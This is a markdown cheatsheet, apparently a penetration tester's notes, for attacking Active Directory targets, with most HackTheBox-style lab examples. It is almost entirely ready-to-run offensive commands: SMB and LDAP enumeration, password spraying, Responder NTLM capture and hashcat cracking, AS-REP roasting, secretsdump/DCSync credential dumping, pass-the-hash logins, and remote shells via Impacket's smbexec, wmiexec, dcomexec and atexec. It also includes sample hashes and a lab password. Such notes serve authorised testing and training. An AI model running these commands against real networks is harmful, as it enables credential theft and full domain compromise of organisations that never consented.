# Active Directory - Network Recon

This is specifically for AD targets. There is also a [generic SMB recon cheatsheet](../network_recon/smb.md)

* [Enumeration](#enumeration)
* [Credential Spray](#credential-spray)
* [Impacket Toolkit](#impacket-toolkit)
* [Bloodhound](#bloodhound)
* [Manual LDAP](#manual-ldap)

## Enumeration

```bash
# Wide spectrum enum
nullinux domc.somedomain.local
nullinux 10.10.10.10
enum4linux -a -M -l -d somedomain.local
enum4linux -a -M -l -d 10.10.10.10

# SMB - default ports: 139 & 445
## SMB map shares and content
smbmap -H 10.10.10.10 -P 139
smbmap -H 10.10.10.10 -P 445
smbmap -H 10.10.10.10 -P 139 -R
smbmap -H 10.10.10.10 -P 445 -R
smbmap -H 10.10.10.10 -P 139 -x "ipconfig /all"
smbmap -H 10.10.10.10 -P 445 -x "ipconfig /all"
smbmap -H 10.10.10.10 -u '' -p '' -P 445
smbmap -H 10.10.10.10 -u 'r.thompson' -p 'password' -P 445

# SMB client login
## SMB Null session and guest logins
smbclient -U ''%'' //10.10.10.10/sharename
smbclient -U anonymous -L //10.10.10.10
smbclient -U guest -L //10.10.10.10

## SMB authenticated
smbclient -U username -L //10.10.10.10
smbclient -U username //10.10.10.10/someshare


# ldap - default ports: 389 & 636
nmap -vv --reason -Pn -sV -p 389 --script="banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)"
ldapsearch -x -h 10.10.10.10 -D '' -w '' -b "DC=somedomain,DC=local"


# Bloodhound collector (rpc/user login required)
pip install bloodhound
python3 -m bloodhound -u 's.smith' -p 'password' -d somedomain.local -ns 10.10.10.10 -c ALL

# RPC - default port: 135
## rpc dump
rpcdump.py domc.somedomain.local

## rpc login
rpcclient -U 's.smith%password' 10.10.10.182


# winrm - default port: 5985
evil-winrm -i 10.10.10.182 -u 's.smith' -p 'password'

# winrm with pass the hash (omit the LM part)
evil-winrm -i 10.10.10.175 -u 'Administrator' -H d9485863c1e9e05851aa40cbb4ab9dff
```

## Credential Spray

If enum4linux, rpc or ldap gives you a list of users, then collect their usernames in a `users.txt` file.

Check smb and winrm login spray if the ports are open (smb 139/445; winrm 5985). Also try username as password, empty password, small pass list.

```bash
# metasploit modules
msf> use scanner/winrm/winrm_login
msf> use scanner/smb/smb_login
msf> use auxiliary/scanner/ftp/ftp_login
msf> use auxiliary/scanner/ssh/ssh_login

# useful settings to turn on
set BLANK_PASSWORDS true
set USER_AS_PASS true
```

## Responder

NBT-NS/LLMNR Responder and Cross-Protocol NTLM Relay.

```bash
sudo responder -I tun0 -A
```

Cracking ntlmv2 hashes:
```bash
.\hashcat64.exe -m 5600 -a 0 ./ntlmv2_example.txt .\rockyou.txt
.\hashcat64.exe -m 5600 -a 3 ./ntlmv2_example.txt -1?a ?1?1?1?1?1?1?1?1 --increment
```

Take the ntlmv2 hash as is from responder (with name and everything).

```bash
bob::SERVER:b9c93460a632fd2e:61656E7AF21DCE8D3D6B2A1A81172509:0101000000000000B1085B524CD8D70132F5B52DDAF92EBF0000000002000400270027000000000000000000
```

## Impacket Toolkit

DCE/RPC SAMR dumper. Useful for finding users and domains:

```bash
samrdump.py 10.10.10.10
```

Figure out computer architecture:

```bash
getArch.py -target master.domain.local
```

Look for users with Kerberos pre-authentication disabled and retrieve their krb5asrep pass hash (crack with hashcat):

```bash
GetNPUsers.py domain.local/ -no-pass -format hashcat -usersfile ./users.txt -dc-ip master.domain.local
GetNPUsers.py domain.local/ -no-pass -format hashcat -usersfile ./users.txt -dc-ip 10.10.10.10
```

Impacket's own smbclient implementation:

```bash
smbclient.py [domain]/[user]@[host]
smbclient.py [domain]/[user]@[host] -dc-ip [domain-controller]
smbclient.py htb/svc-alfresco@FOREST -dc-ip 10.10.10.161
```

(authenticated) Bruteforces user SIDs. Requires an rpc user:pass that works:

```bash
lookupsid.py 'username:password'@10.10.10.10
```

(authenticated) Track sessions opened on the remote host(s):

```bash
netview.py someuser -target 10.10.10.10
netview.py DOMAIN/someuser -target 10.10.10.10
netview.py -users ./users -dc-ip freefly-dc.freefly.net -k FREEFLY.NET/beto
```

(Administrator) Dump SAM to extract NTLM hashes of local users. Use DCSync to extract domain credentials:

```bash
secretsdump.py [domain]/[user]@[host]

# only dcsync
secretsdump.py -just-dc [domain]/[user]@[host] -hashes [nl]:[nt]
```

### Impacket remote shells

Get a remote shell via SMB (usually requires Administrator creds):

```bash
smbexec.py SECNOTES/Administrator:u6!4ZwgwOM#^OBf#Nwnh@10.10.10.97
smbexec.py DOMAIN/username:password@host
smbexec.py DOMAIN/username@host -hashes aad3b435b51404eeaad3b435b51404ee:0CB6948805F797BF2A82807973B89537
```

Get a remote shell via WMI endpoint:
```bash
wmiexec.py [domain]/[user]:[password]@[host]
wmiexec.py htb/someuser@somehost -hashes aad3b435b51404eeaad3b435b51404ee:0CB6948805F797BF2A82807973B89537
```

Get a remote shell via DCOM:
```bash
dcomexec.py -object MMC20 [domain]/[user]:[password]@[host]
dcomexec.py -object MMC20 htb/someuser@somehost -hashes aad3b435b51404eeaad3b435b51404ee:0CB6948805F797BF2A82807973B89537
```

RCE via Task Scheduler Service:
```bash
atexec.py DOMAIN/username:password@host whoami
```

## Bloodhound

> BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.

Start bloodhound
```bash
sudo neo4j console
bloodhound
```

Remote collect sharphound data:
```bash
# Bloodhound collector (rpc/user login required)
pip install bloodhound
python3 -m bloodhound -u 's.smith' -p 'password' -d somedomain.local -ns 10.10.10.10 -c ALL
```

Clear the db (if necessary) and import the files collected by the sharphound binary or the remote python collector.


### Notes

* Users with DCSync privileges should be able to perform `secretsdump.py`


## Manual LDAP

* Documentation: https://ldap3.readthedocs.io/en/latest/bind.html

Start python3 interactive mode.

```python
$ python3
>>> import ldap3
>>> server = ldap3.Server('10.10.10.10', get_info = ldap3.ALL, port=636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
```

If you don't get `True` then try without SSL. If you don't get True with that either, then you probably need credentials.

Authenticated version:
```python
$ python3
>>> import ldap3
>>> server = ldap3.Server('10.10.10.10', get_info = ldap3.ALL, port=636, use_ssl = True)
>>> connection = ldap3.Connection(server, user='user_dn', password='user_password', auto_bind=True)
>>> connection.bind()
```

Print basic server info:

```python
>>> server.info
```

At the top of the printout you should find:
```python
Naming contexts:
  dc=DOMAIN,dc=TOPDOMAIN
```

Which should be the same as the domain you are investigating, so `DOMAIN.TOPDOMAIN` or for example `somedomain.local` or `cascade.htb`.

Now you should be able to search the LDAP tree. 

```python
# Print everything 
>>> connection.search(search_base='DC=DOMAIN,DC=TOPDOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
# printout here
```

Example `search_filters`:
```python
# save the root as variable
domain_saved = 'DC=DOMAIN,DC=TOPDOMAIN'

# everything
# (&(objectClass=*))
connection.search(search_base=domain_saved, search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*');connection.entries

# all users
# (&(objectClass=person))
connection.search(search_base=domain_saved, search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='*');connection.entries

# all users, only select some fields
# (&(objectClass=person))
# ['displayName', 'sAMAccountName']
connection.search(search_base=domain_saved, search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes=['displayName', 'sAMAccountName']);connection.entries

# individual user by username
# (&(sAMAccountName=s.smith))
connection.search(search_base=domain_saved, search_filter='(&(sAMAccountName=s.smith))', search_scope='SUBTREE', attributes='*');connection.entries
connection.search(search_base=domain_saved, search_filter='(&(sAMAccountName=s.smith))', search_scope='SUBTREE', attributes=['displayName', 'sAMAccountName']);connection.entries

# all computers
connection.search(search_base=domain_saved, search_filter='(&(objectClass=computer))', search_scope='SUBTREE', attributes='*');connection.entries

# all groups
connection.search(search_base=domain_saved, search_filter='(&(objectClass=group))', search_scope='SUBTREE', attributes='*');connection.entries
connection.search(search_base=domain_saved, search_filter='(&(objectClass=group))', search_scope='SUBTREE', attributes=['dn', 'name', 'sAMAccountName']);connection.entries
```

Syntax for `search_filters`:
```bash
# Negated, list all entries where sn is not Smith
(!(sn=Smith))

# AND, all must be true
(&(givenName=A*)(sn=Smith))

# OR, one of them must be true
(|(sn=Smith)(sn=Johnson))
```

To JSON:
```python
# search results to json (press enter twice)
for entry in connection.entries: print(entry.entry_to_json())

# server info to json
print(server.info.to_json())
```
